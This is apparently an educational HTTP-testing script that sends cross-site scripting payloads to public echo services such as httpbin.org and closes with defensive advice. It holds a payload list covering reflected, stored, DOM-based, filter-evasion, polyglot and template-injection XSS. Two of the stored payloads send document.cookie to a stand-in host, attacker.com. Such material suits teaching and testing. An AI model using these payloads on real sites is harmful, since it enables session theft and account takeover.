# Penetration Testing Demo 2: Cross-Site Scripting (XSS) Testing
# ETHICAL USE ONLY - Test your own systems or authorized targets only
# Read ETHICAL_USE_AGREEMENT.md before using

print "🌐 === Penetration Testing Demo 2: XSS (Cross-Site Scripting) Testing ==="
print "⚠️ ETHICAL USE ONLY - Authorized testing environments only"
print "🎯 Target: Testing APIs for XSS vulnerabilities"

# ============================================================================
# ETHICAL TESTING DISCLAIMER
# ============================================================================
print ""
print "🔒 ETHICAL TESTING REQUIREMENTS:"
print "✅ Use only on systems you own or have written permission to test"
print "✅ Test in isolated environments only"
print "✅ Never execute malicious scripts on real systems"
print "❌ NEVER test unauthorized systems"
print "❌ NEVER attempt actual XSS exploitation"

# Safe test endpoints
set $safe_test_base "https://httpbin.org"
set $demo_api "https://jsonplaceholder.typicode.com"

# ============================================================================
# XSS TEST 1: REFLECTED XSS PATTERNS
# ============================================================================
print ""
print "🪞 Test 1: Reflected XSS Pattern Testing"
print "Testing common reflected XSS payloads (educational/defensive)"

# Basic XSS payloads (educational - these won't execute on httpbin)
set $basic_xss "<script>alert('XSS')</script>"
set $img_xss "<img src=x onerror=alert('XSS')>"
set $svg_xss "<svg onload=alert('XSS')>"

print "Testing reflected XSS patterns..."

# Test basic script injection (safe on httpbin)
GET "$safe_test_base/html"
    header "X-XSS-Test" "reflected-basic"
    header "X-Payload" "$basic_xss"
    header "X-Test-Purpose" "xss-vulnerability-assessment"

assert status 200
print "✅ Basic reflected XSS pattern tested (httpbin safe)"

# Test image-based XSS
POST "$safe_test_base/post" json {
    "comment": "$img_xss",
    "title": "Image XSS Test",
    "test_type": "reflected_xss_img"
}
    header "X-Pentest-Type" "xss-reflected-img"

assert status 200
print "✅ Image-based XSS pattern tested"

# Test SVG-based XSS
POST "$safe_test_base/post" json {
    "content": "$svg_xss",
    "description": "SVG XSS Test",
    "test_type": "reflected_xss_svg"
}
    header "X-Pentest-Type" "xss-reflected-svg"

assert status 200
print "✅ SVG-based XSS pattern tested"

# ============================================================================
# XSS TEST 2: STORED/PERSISTENT XSS PATTERNS
# ============================================================================
print ""
print "💾 Test 2: Stored/Persistent XSS Pattern Testing"

set $stored_xss_basic "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
set $stored_xss_iframe "<iframe src='javascript:alert(\"Stored XSS\")'></iframe>"
set $stored_xss_form "<form action='http://attacker.com/steal' method=POST><input type=hidden name=data value='+document.cookie+'></form>"

print "Testing stored XSS patterns..."

# Test stored XSS in comments (educational)
POST "$demo_api/comments" json {
    "name": "Test User",
    "email": "test@example.com", 
    "body": "$stored_xss_basic",
    "postId": 1,
    "test_type": "stored_xss_comment"
}
    header "X-Pentest-Type" "xss-stored-comment"
    header "Content-Type" "application/json"

assert status 201
extract jsonpath "$.id" as $comment_id
print "✅ Stored XSS comment pattern tested - ID: $comment_id"

# Test stored XSS in posts
POST "$demo_api/posts" json {
    "title": "Test Post with XSS",
    "body": "$stored_xss_iframe",
    "userId": 1,
    "test_type": "stored_xss_post"
}
    header "X-Pentest-Type" "xss-stored-post"

assert status 201
extract jsonpath "$.id" as $post_id
print "✅ Stored XSS post pattern tested - ID: $post_id"

# ============================================================================
# XSS TEST 3: DOM-BASED XSS PATTERNS
# ============================================================================
print ""
print "🌳 Test 3: DOM-Based XSS Pattern Testing"

set $dom_xss_hash "#<script>alert('DOM XSS')</script>"
set $dom_xss_param "javascript:alert('DOM XSS')"
set $dom_xss_location "http://example.com#<img src=x onerror=alert('DOM')>"

print "Testing DOM-based XSS patterns..."

# Test DOM XSS through URL parameters (simulated)
GET "$safe_test_base/get"
    header "X-DOM-Test" "hash-based"
    header "X-Fragment" "$dom_xss_hash"
    header "X-Pentest-Type" "xss-dom-hash"

assert status 200
print "✅ DOM XSS hash-based pattern tested"

# Test DOM XSS through javascript: URLs
POST "$safe_test_base/post" json {
    "redirect_url": "$dom_xss_param",
    "action": "navigate",
    "test_type": "dom_xss_javascript_url"
}
    header "X-Pentest-Type" "xss-dom-javascript-url"

assert status 200
print "✅ DOM XSS javascript: URL pattern tested"

# ============================================================================
# XSS TEST 4: FILTER EVASION TECHNIQUES
# ============================================================================
print ""
print "🕳️ Test 4: XSS Filter Evasion Testing"

set $evasion_case "<ScRiPt>alert('XSS')</ScRiPt>"
set $evasion_encoding "&#60;script&#62;alert('XSS')&#60;/script&#62;"
set $evasion_char_codes "<script>String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)</script>"
set $evasion_double_encode "%253Cscript%253Ealert('XSS')%253C/script%253E"

print "Testing XSS filter evasion techniques..."

# Test case variation evasion
POST "$safe_test_base/post" json {
    "payload": "$evasion_case",
    "evasion_type": "case_variation",
    "test_type": "xss_filter_evasion"
}
    header "X-Pentest-Type" "xss-evasion-case"

assert status 200
print "✅ Case variation evasion tested"

# Test HTML entity encoding evasion
POST "$safe_test_base/post" json {
    "payload": "$evasion_encoding",
    "evasion_type": "html_entity_encoding",
    "test_type": "xss_filter_evasion"
}
    header "X-Pentest-Type" "xss-evasion-encoding"

assert status 200
print "✅ HTML entity encoding evasion tested"

# Test character code evasion
POST "$safe_test_base/post" json {
    "payload": "$evasion_char_codes",
    "evasion_type": "character_codes",
    "test_type": "xss_filter_evasion"
}
    header "X-Pentest-Type" "xss-evasion-char-codes"

assert status 200
print "✅ Character code evasion tested"

# ============================================================================
# XSS TEST 5: CONTEXT-SPECIFIC XSS PATTERNS
# ============================================================================
print ""
print "📋 Test 5: Context-Specific XSS Testing"

# Different contexts require different XSS approaches
set $attr_xss "\" onmouseover=\"alert('XSS')\""
set $js_xss "';alert('XSS');//"
set $css_xss "expression(alert('XSS'))"
set $json_xss "\"},\"xss\":\"<script>alert('XSS')</script>"

print "Testing context-specific XSS patterns..."

# Test attribute context XSS
POST "$safe_test_base/post" json {
    "title": "Test Title",
    "alt_text": "$attr_xss",
    "context": "html_attribute",
    "test_type": "xss_attribute_context"
}
    header "X-Pentest-Type" "xss-context-attribute"

assert status 200
print "✅ HTML attribute context XSS tested"

# Test JavaScript context XSS
POST "$safe_test_base/post" json {
    "user_input": "$js_xss",
    "context": "javascript_variable",
    "test_type": "xss_javascript_context"
}
    header "X-Pentest-Type" "xss-context-javascript"

assert status 200
print "✅ JavaScript context XSS tested"

# Test JSON context XSS
POST "$safe_test_base/post" json {
    "data": "{\"name\":\"user$json_xss\"}",
    "context": "json_data",
    "test_type": "xss_json_context"
}
    header "X-Pentest-Type" "xss-context-json"

assert status 200
print "✅ JSON context XSS tested"

# ============================================================================
# XSS TEST 6: ADVANCED XSS TECHNIQUES
# ============================================================================
print ""
print "🔬 Test 6: Advanced XSS Techniques Testing"

set $polyglot_xss "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>'"
set $mutation_xss "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
set $template_xss "{{constructor.constructor('alert(1)')()}}"

print "Testing advanced XSS techniques..."

# Test polyglot XSS (works in multiple contexts)
POST "$safe_test_base/post" json {
    "polyglot_payload": "$polyglot_xss",
    "technique": "polyglot",
    "test_type": "xss_advanced_polyglot"
}
    header "X-Pentest-Type" "xss-advanced-polyglot"

assert status 200
print "✅ Polyglot XSS technique tested"

# Test mutation XSS
POST "$safe_test_base/post" json {
    "mutation_payload": "$mutation_xss",
    "technique": "dom_mutation",
    "test_type": "xss_advanced_mutation"
}
    header "X-Pentest-Type" "xss-advanced-mutation"

assert status 200
print "✅ Mutation XSS technique tested"

# Test template injection XSS
POST "$safe_test_base/post" json {
    "template_payload": "$template_xss",
    "technique": "template_injection",
    "test_type": "xss_advanced_template"
}
    header "X-Pentest-Type" "xss-advanced-template"

assert status 200
print "✅ Template injection XSS tested"

# ============================================================================
# XSS TESTING SUMMARY AND RECOMMENDATIONS
# ============================================================================
print ""
print "📊 === XSS Testing Summary ==="
print "════════════════════════════════"

print "XSS Attack Patterns Tested:"
print "✅ Reflected XSS (basic, img, svg)"
print "✅ Stored/Persistent XSS (comments, posts)"
print "✅ DOM-based XSS (hash, javascript:)"
print "✅ Filter Evasion (case, encoding, char codes)"
print "✅ Context-specific (attribute, JS, JSON)"
print "✅ Advanced techniques (polyglot, mutation, template)"

print ""
print "🛡️ XSS Prevention Measures to Implement:"
print "• Input validation and sanitization"
print "• Output encoding (HTML, JS, URL, CSS contexts)"
print "• Content Security Policy (CSP) headers"
print "• X-XSS-Protection headers"
print "• HttpOnly cookie flags"
print "• Secure coding practices"

print ""
print "🔍 What to Look For in Real Testing:"
print "• User input reflected in HTML without encoding"
print "• Stored user content displayed without sanitization"
print "• JavaScript execution in browser"
print "• Cookie theft or session hijacking capability"
print "• Defacement or content manipulation"
print "• Redirection to malicious sites"

print ""
print "📋 XSS Testing Checklist:"
print "• Test all input fields and parameters"
print "• Try different XSS contexts (HTML, JS, CSS, JSON)"
print "• Test stored vs reflected vs DOM-based"
print "• Attempt filter evasion techniques"
print "• Check for CSP bypass opportunities"
print "• Validate encoding in different contexts"

print ""
print "⚠️ IMPORTANT REMINDERS:"
print "• These tests were performed on safe endpoints"
print "• Real XSS testing should only be done on authorized systems"
print "• Never execute actual malicious payloads"
print "• Follow responsible disclosure for real vulnerabilities"
print "• Document all testing activities"

print ""
print "🎯 Recommended Testing Environments:"
print "• DVWA (Damn Vulnerable Web Application)"
print "• bWAPP (Buggy Web Application)"  
print "• WebGoat (OWASP)"
print "• XSS Hunter (for stored XSS testing)"
print "• Your own development/testing applications"

print ""
print "🔧 Recommended Tools:"
print "• Burp Suite (Professional scanner)"
print "• OWASP ZAP (Free scanner)"
print "• XSStrike (Specialized XSS tool)"
print "• BeEF (Browser Exploitation Framework - for authorized testing)"
print "• Browser developer tools"

print ""
print "✅ Penetration Testing Demo 2 completed - XSS patterns!"
print "🔒 Remember: Use these techniques only for ethical security testing"
print "🛡️ Help make the web safer by testing and fixing XSS vulnerabilities"